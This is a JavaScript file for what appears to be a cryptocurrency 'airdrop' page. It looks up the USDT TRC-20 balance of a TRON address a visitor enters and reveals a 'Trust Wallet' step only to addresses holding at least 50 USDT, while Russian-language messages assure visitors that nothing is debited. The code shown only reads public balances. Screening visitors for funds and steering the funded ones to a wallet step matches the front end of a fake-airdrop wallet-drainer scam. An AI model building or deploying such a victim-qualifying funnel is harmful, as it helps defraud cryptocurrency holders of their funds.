const form = document.getElementById("walletForm");
const input = document.getElementById("tronAddress");
const status = document.getElementById("statusMsg");
const clearBtn = document.getElementById("clearBtn");
const checkBtn = document.getElementById("checkBtn");
const trustOnly = document.getElementById("trustOnly");

// ===== AIRDROP SETTINGS =====
const MIN_USDT = 50;
const USDT_DECIMALS = 6;
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_NODE = "https://api.trongrid.io";

function setStatus(message, type = "") {
  status.textContent = message;
  status.className = "status" + (type ? ` ${type}` : "");
}

function isValidTronAddress(address) {
  return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address);
}

function formatUsdt(value) {
  return Number(value).toLocaleString("en-US", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 6
  });
}

function base58ToHex(address) {
  const alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  let num = 0n;

  for (const char of address) {
    const index = alphabet.indexOf(char);
    if (index === -1) throw new Error("Invalid Base58 address");
    num = num * 58n + BigInt(index);
  }

  let hex = num.toString(16);
  if (hex.length % 2) hex = "0" + hex;

  let leadingZeros = 0;
  for (const char of address) {
    if (char !== "1") break;
    leadingZeros++;
  }

  hex = "00".repeat(leadingZeros) + hex;
  const bytes = hex.match(/.{2}/g) || [];

  if (bytes.length !== 25) throw new Error("Invalid TRON address length");
  if (bytes[0].toLowerCase() !== "41") throw new Error("Not a TRON mainnet address");

  return bytes.slice(0, 21).join("");
}

async function getUsdtBalance(address) {
  const hexAddress = base58ToHex(address);
  const parameter = hexAddress.slice(2).padStart(64, "0");

  const response = await fetch(`${TRON_NODE}/wallet/triggerconstantcontract`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      owner_address: address,
      contract_address: USDT_CONTRACT,
      function_selector: "balanceOf(address)",
      parameter,
      visible: true
    })
  });

  if (!response.ok) throw new Error(`HTTP ${response.status}`);

  const data = await response.json();
  if (!data.constant_result || !data.constant_result[0]) {
    throw new Error("USDT balance response is empty");
  }

  const raw = BigInt("0x" + data.constant_result[0]);
  return Number(raw) / 10 ** USDT_DECIMALS;
}

function showTrustWalletStep() {
  trustOnly.hidden = false;
  trustOnly.scrollIntoView({ behavior: "smooth", block: "center" });
}

async function checkEligibility(address) {
  if (!isValidTronAddress(address)) {
    setStatus("Некорректный TRON-адрес. Адрес должен начинаться с T.", "error");
    return false;
  }

  const oldText = checkBtn.innerHTML;
  checkBtn.disabled = true;
  checkBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Проверяем USDT...';
  setStatus("Проверяем публичный баланс USDT TRC-20. Средства не списываются и не перемещаются...");

  try {
    const usdt = await getUsdtBalance(address);

    if (usdt >= MIN_USDT) {
      setStatus(
        `✓ Проверка пройдена. На адресе ${formatUsdt(usdt)} USDT. Требование: минимум ${MIN_USDT} USDT. Эти средства достаточно просто удерживать на кошельке.`,
        "success"
      );
      showTrustWalletStep();
      return true;
    }

    trustOnly.hidden = true;
    setStatus(
      `Баланс: ${formatUsdt(usdt)} USDT. Для участия необходимо минимум ${MIN_USDT} USDT TRC-20. Отправлять USDT никуда не нужно — после пополнения просто удерживайте сумму на кошельке.`,
      "error"
    );
    return false;
  } catch (error) {
    console.error("USDT TRC-20 balance check:", error);
    setStatus("Не удалось получить USDT-баланс. Проверьте адрес и повторите попытку.", "error");
    return false;
  } finally {
    checkBtn.disabled = false;
    checkBtn.innerHTML = oldText;
  }
}

form.addEventListener("submit", async (event) => {
  event.preventDefault();
  await checkEligibility(input.value.trim());
});

input.addEventListener("input", () => {
  input.value = input.value.replace(/\s+/g, "");
  trustOnly.hidden = true;
  setStatus("");
});

clearBtn.addEventListener("click", () => {
  input.value = "";
  trustOnly.hidden = true;
  setStatus("");
  input.focus();
});

// Soft reveal on scroll.
const revealItems = document.querySelectorAll(
  ".stat-card, .feature-card, .drop-card, .road-step, .eco-card, .airdrop-card, .tokenomics, .drop-warning, .drop-date-card"
);

if ("IntersectionObserver" in window) {
  revealItems.forEach((el) => {
    el.style.opacity = "0";
    el.style.transform = "translateY(16px)";
    el.style.transition = "opacity .6s ease, transform .6s ease";
  });

  const observer = new IntersectionObserver((entries, obs) => {
    entries.forEach((entry) => {
      if (!entry.isIntersecting) return;
      entry.target.style.opacity = "1";
      entry.target.style.transform = "translateY(0)";
      obs.unobserve(entry.target);
    });
  }, { threshold: 0.12 });

  revealItems.forEach((el) => observer.observe(el));
}
